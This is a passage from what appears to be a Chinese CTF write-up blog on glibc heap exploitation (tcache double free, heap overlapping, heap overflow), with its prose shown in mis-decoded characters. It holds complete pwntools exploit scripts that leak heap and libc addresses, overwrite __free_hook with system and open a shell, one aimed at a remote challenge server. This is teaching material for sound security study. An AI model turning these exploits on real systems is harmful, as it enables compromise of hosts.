class="hljs-string">&#x27;freehook&#x27;</span>, <span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])*<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#p.interactive()</span><br>    edit(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x8</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">10</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    free(<span class="hljs-string">&#x27;sheep&#x27;</span>) <span class="hljs-comment"># system(&quot;/bin/sh&quot;)</span><br>    p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<h5 id="ä¾‹é¢˜2ï¼ˆfastbin-double-freeï¼‰ï¼šciscn-2019-final-3"><a href="#ä¾‹é¢˜2ï¼ˆfastbin-double-freeï¼‰ï¼šciscn-2019-final-3" class="headerlink" title="ä¾‹é¢˜2ï¼ˆfastbin double freeï¼‰ï¼šciscn_2019_final_3"></a>ä¾‹é¢˜2ï¼ˆfastbin double freeï¼‰ï¼šciscn_2019_final_3</h5><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/04/KIZF84yhjVTaSAE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªè£¸çš„ UAF</p>
<p><img src="https://i.loli.net/2021/04/04/6woiXGIQdv95Dgt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å”¯ä¸€çš„è¾“å‡ºåŠŸèƒ½æ˜¯åœ¨æ¯æ¬¡åˆ†é…ä¹‹åä¼šç»™å‡º chunk çš„åœ°å€ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ³„éœ² <code>å †åŸºå€</code>ï¼Œè€Œæˆ‘ä»¬åç»­è‹¥æ˜¯èƒ½å¤Ÿåˆ†é…åˆ°ä¸€ä¸ªä½äº libc ä¸­çš„ chunk ï¼Œåˆ™æ¯«æ— ç–‘é—®ä¹Ÿèƒ½æ³„éœ² libc åŸºå€</p>
<p><img src="https://i.loli.net/2021/04/05/mXUwpYVoHSFWB3G.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åŒæ—¶é¢˜ç›®é™åˆ¶äº†åªèƒ½åˆ†é… <code>0x78</code> ä»¥ä¸‹çš„ chunk ï¼Œæˆ‘ä»¬æ²¡æ³•ç›´æ¥è·å¾—ä¸€ä¸ª unsorted bin chunk</p>
<p><img src="https://i.loli.net/2021/04/05/4efPFN6QT1Rj7Kc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¢˜ç›®ç»™å‡ºçš„ libc ä¸º<code>æ²¡æœ‰ double free æ£€æµ‹çš„ 2.27 ç‰ˆæœ¬</code>ï¼Œä½†æ˜¯ç¬”è€…ä¸ªäººè§‰å¾—æ—¢ç„¶å¾€åçš„æ–°ç‰ˆæœ¬ libc çš„ tcache éƒ½æœ‰ double free æ£€æµ‹ï¼Œç°åœ¨è¿™é‡Œä¸»åŠ¨å¿½è§†æ‰è¿™ä¸€ç‚¹ç­‰äºæ˜¯è‡ªæ¬ºæ¬ºäººï¼ˆï¼‰ï¼Œäºæ˜¯ç¬”è€…é€‰æ‹©<strong>é€šè¿‡ stash æœºåˆ¶ç»•è¿‡ double free æ£€æµ‹çš„åšæ³•</strong></p>
<blockquote>
<p>ä¸»åŠ¨æé«˜é¢˜ç›®éš¾åº¦çš„å±‘äºº</p>
</blockquote>
<p>ç”±äºé¢˜ç›®ä»…ä»…å…è®¸åˆ†é… <code>0x18</code> æ¬¡ chunkï¼Œè€Œåˆ©ç”¨ stash ç»•è¿‡ double free æ£€æµ‹è‡³å°‘éœ€è¦ä½¿ç”¨å…¶ä¸­çš„ <code>19</code> æ¬¡ï¼Œç¬¬ <code>20</code> æ¬¡æ‰æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç²¾ç¡®è®¡ç®—åˆ©ç”¨å¥½å‰©ä¸‹çš„ <code>4</code> æ¬¡æœºä¼š</p>
<p>é‚£ä¹ˆåœ¨è¿™é‡Œç¬”è€…é€‰æ‹©åŠ«æŒ tcache struct ï¼š</p>
<ul>
<li>tcache struct å¤§å°ä¸º 0x250ï¼ˆlibc 2.27ï¼‰ï¼Œfreeåˆšå¥½å¯ä»¥æ”¾å…¥ unsorted bin</li>
<li>å¯ä»¥ç›´æ¥æ§åˆ¶å¯¹åº”ä¸‹æ ‡çš„ count ï¼Œè€Œä¸éœ€è¦æƒ³åŠæ³•åˆ†é…å¤§äº 0x400 çš„ chunk ä»¥ç•¥è¿‡ tcache</li>
<li>å¯ä»¥ç›´æ¥æ§åˆ¶å¯¹åº”ä¸‹æ ‡å­˜æ”¾çš„ chunk</li>
</ul>
<p>æˆ‘ä»¬æ§åˆ¶ tcache struct ä¹‹åç›´æ¥åœ¨åˆé€‚ä¸‹æ ‡å†… <strong>å†å†™å…¥ tcache åœ°å€ï¼ŒäºŒæ¬¡åˆ†é…åæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåˆ†é…åˆ°ä¸€ä¸ª libc ä¸­çš„ chunkï¼Œä»¥æ­¤æ³„éœ² libc åŸºå€</strong></p>
<p>æœ€åå°±æ˜¯æ”¹ <code>__free_hook</code> ä¸º <code>system</code> çš„å¸¸è§„æµç¨‹ï¼Œç”±äº chunk æ•°é‡é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦å¤šæ¬¡æ§åˆ¶ tcache struct</p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">26084</span>) <span class="hljs-comment">#process(&#x27;./ciscn_final_3&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>) <span class="hljs-comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>,size:<span class="hljs-built_in">int</span> , content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;input the size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;now you can write something&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    heap_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;heap addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    heap_base = heap_leak - <span class="hljs-number">0x11e70</span><br>    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br>    free(<span class="hljs-number">7</span>)<br>    free(<span class="hljs-number">8</span>)<br>    free(<span class="hljs-number">7</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>):<br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    new(<span class="hljs-number">17</span>, <span class="hljs-number">0x70</span>, p64(heap_base + <span class="hljs-number">0x10</span>))<br>    new(<span class="hljs-number">18</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">19</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">20</span>, <span class="hljs-number">0x70</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">35</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="hljs-number">0x10</span>) * <span class="hljs-number">6</span>)<br>    free(<span class="hljs-number">20</span>)<br>    new(<span class="hljs-number">21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">22</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    libc_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;libc addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    new(<span class="hljs-number">23</span>, <span class="hljs-number">0x50</span>, (<span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>    new(<span class="hljs-number">24</span>, <span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">10</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/05/vA7IVD4GBjLYhcp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="ä¸‰ã€å †é‡å ï¼ˆHeap-Overlappingï¼‰"><a href="#ä¸‰ã€å †é‡å ï¼ˆHeap-Overlappingï¼‰" class="headerlink" title="ä¸‰ã€å †é‡å ï¼ˆHeap Overlappingï¼‰"></a>ä¸‰ã€å †é‡å ï¼ˆHeap Overlappingï¼‰</h2><p>å †å—é‡å å³æˆ‘ä»¬<strong>åŒæ—¶æ‹¥æœ‰ä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„ä¸‹æ ‡æŒ‡å‘åŒä¸€ä¸ª chunk</strong>ï¼ˆåŒä¸€ä¸ªåœ°å€ï¼‰ï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ä¾¿å¯ä»¥æ‰‹åŠ¨å®ç° double free ã€åœ°å€æ³„éœ²ï¼ˆä¾‹å¦‚é‡Šæ”¾ä¸€ä¸ªä¸‹æ ‡åé€šè¿‡å¦ä¸€ä¸ªä¸‹æ ‡æ‰“å° chunk å†…å®¹ä»è€Œè·å¾—<strong>å †&#x2F;libc</strong>ç›¸å…³åœ°å€ï¼‰ç­‰å„ç§åˆ©ç”¨ï¼Œååˆ†æ–¹ä¾¿</p>
<h4 id="ä¾‹é¢˜ï¼š-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><a href="#ä¾‹é¢˜ï¼š-CTF2021-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="ä¾‹é¢˜ï¼š*CTF2021 - babyheap - Use After Free + tcache poisoning"></a>ä¾‹é¢˜ï¼š*CTF2021 - babyheap - Use After Free + tcache poisoning</h4><blockquote>
<p> æ¯”è¾ƒç™½ç»™çš„ç­¾åˆ°é¢˜</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babyheap.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babyheap.zip</a></p>
<p>æƒ¯ä¾‹çš„checksecï¼Œä¿æŠ¤å…¨å¼€ï¼ˆ<del>åŸºæœ¬ä¸Šå¤§æ¯”èµ›é¢˜ç›®éƒ½æ˜¯é»˜è®¤ä¿æŠ¤å…¨å¼€çš„</del></p>
<p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€åˆ é™¤ã€ä¿®æ”¹ã€æ‰“å°å †å—å†…å®¹</strong>çš„åŠŸèƒ½ï¼Œ<del>ç»™çš„é¢é¢ä¿±åˆ°ï¼Œååˆ†ç™½ç»™</del></p>
<p>æ¼æ´ç‚¹åœ¨äº<code>delete()</code>å‡½æ•°ä¸­freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨ Use After Freeæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>add()</code>å‡½æ•°ä¸­æˆ‘ä»¬æœ‰ç€16ä¸ªå¯ç”¨çš„ä¸‹æ ‡ï¼Œä¸”åˆ†é…æ—¶ä¼šç›´æ¥è¦†å†™åŸæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å‡ ä¹æ˜¯å¯ä»¥åˆ†é…ä»»æ„ä¸ªchunkï¼Œä½†æ˜¯<strong>åªå…è®¸æˆ‘ä»¬åˆ†é…fastbin sizeèŒƒå›´çš„chunk</strong></p>
<p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å› æ­¤è‹¥æƒ³è¦æ³„éœ²libcåœ°å€æˆ‘ä»¬éœ€è¦å€ŸåŠ©<code>malloc_consolidate()</code>å°†chunké€å…¥small binsä¸­</p>
<p>æ³¨æ„åˆ°<code>leaveYourName()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨ malloc() åˆ†é…ä¸€ä¸ªå¤§chunkï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°è§¦å‘<code>malloc_consolidate()</code>ï¼Œå°† fastbin ä¸­ chunk é€å…¥ smallbinï¼Œ ä»¥æ³„éœ²libcåŸºå€</p>
<p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" srcset="/img/loading.gif" lazyload alt="~D9_XAV_4G5_FGKSMTED_13.png"></p>
<p>gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¯¥åœ°å€ä¸main_arenaé—´è·336ï¼Œå› è€Œæˆ‘ä»¬ä¾¿å¯ä»¥å¾—åˆ°libcåŸºå€</p>
<p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><strong>å°†è¿™ä¸ª small bin å†åˆ†é…å›æ¥æˆ‘ä»¬å°±èƒ½å¤Ÿå®ç° chunk overlapping äº†ï¼Œç»§è€Œå°±æ˜¯é€šè¿‡ç¨‹åºçš„ edit åŠŸèƒ½å®ç° tcache poisoning ä¿®æ”¹ __free_hook ä¸º system() å free ä¸€ä¸ªå†…å®¹ä¸º â€œ&#x2F;bin&#x2F;shâ€ çš„ chunk å³å¯ get shell</strong></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>edit()</code>å‡½æ•°ä¸­æ˜¯<strong>ä» bk çš„ä½ç½®å¼€å§‹è¾“å…¥</strong>çš„ï¼Œå› è€Œæˆ‘ä»¬çš„ fake chunk éœ€è¦æ„é€ åˆ°<code>__free_hook - 8 </code>çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>) <span class="hljs-comment"># p = remote(&#x27;52.152.231.198&#x27;, 8081)</span><br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, size:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;input size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;input content&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leaveYourName</span>(<span class="hljs-params">content</span>):<br>    cmd(<span class="hljs-number">5</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;your name:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        new(i, <span class="hljs-number">0x10</span>)<br><br>    <span class="hljs-comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        delete(i)<br><br>    <span class="hljs-comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span><br>    leaveYourName(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    dump(<span class="hljs-number">7</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">336</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Libc addr:&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>    <span class="hljs-comment">#tcache poisoning</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        new(i, <span class="hljs-number">0x10</span>)<br>    new(<span class="hljs-number">7</span>, <span class="hljs-number">0x60</span>)<br>    edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>))<br>    delete(<span class="hljs-number">10</span>)<br>    delete(<span class="hljs-number">9</span>)<br>    delete(<span class="hljs-number">8</span>)<br>    edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x21</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">8</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook</span><br>    new(<span class="hljs-number">10</span>, <span class="hljs-number">0x10</span>)<br>    new(<span class="hljs-number">9</span>, <span class="hljs-number">0x10</span>)<br>    edit(<span class="hljs-number">9</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># get the shell</span><br>    edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br>    delete(<span class="hljs-number">8</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="å››ã€å †æº¢å‡º"><a href="#å››ã€å †æº¢å‡º" class="headerlink" title="å››ã€å †æº¢å‡º"></a>å››ã€å †æº¢å‡º</h2><p>å †æº¢å‡ºé€šå¸¸æŒ‡çš„æ˜¯åœ¨ç¨‹åºè¯»å–è¾“å…¥åˆ°å †å—ä¸Šæ—¶ï¼Œæœªç»ä¸¥æ ¼çš„æ£€æµ‹ï¼ˆå¦‚ä½¿ç”¨<code>gets()</code>è¯»å…¥ï¼‰ï¼Œå¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¯ä»¥æº¢å‡ºåˆ°å…¶ç‰©ç†ç›¸é‚»é«˜åœ°å€çš„chunkï¼Œä»è€Œæ”¹å†™å…¶ç»“æ„ï¼Œäºˆæ”»å‡»è€…ä»¥æ— é™çš„åˆ©ç”¨ç©ºé—´</p>
<h4 id="ä¾‹é¢˜ï¼šbabyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#ä¾‹é¢˜ï¼šbabyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šbabyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>ä¾‹é¢˜ï¼šbabyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h4><blockquote>
<p>ä¼¼ä¹æ˜¯æ¯”è¾ƒç»å…¸çš„å †æº¢å‡ºå…¥é—¨é¢˜â€¦â€¦ï¼Ÿ</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p>
